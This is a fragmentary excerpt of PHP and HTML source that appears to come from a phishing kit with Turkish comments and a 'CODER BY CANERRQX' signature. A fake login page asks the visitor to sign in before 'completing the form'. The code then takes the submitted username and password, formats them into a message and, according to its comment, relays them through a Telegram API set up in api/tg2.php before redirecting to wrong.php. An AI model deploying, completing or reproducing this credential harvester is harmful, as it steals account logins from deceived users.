...
if($_POST){
    ...
    //Telegram apisini eklemek ve ya değiştirmek için api/tg2.php ye gidip ayarlayın//
    include 'api/tg2.php';
    ...
    <html>
      ...
      <meta name='viewport' content='width=device-width, initial-scale=1'>
            ...
            <font color='black'>CODER BY CANERRQX </font><br>
    <font color='red'>Kullanıcı adı: </font><font color='black'>".$id."</font><br>
    <font color='red'>Şifre: </font><font color='black'>".$zwoup."</font><br>
  ...
  echo '';
      ...
      header("location: wrong.php?id=$id");
...
<el class="login100-form validate-form" id="elemend"><form id="two">
  ...
  <center><p>Dear @<?php echo $id ?>  Before completing the form, you must login with your account.</p></center>
            <br>
    <form method="post">
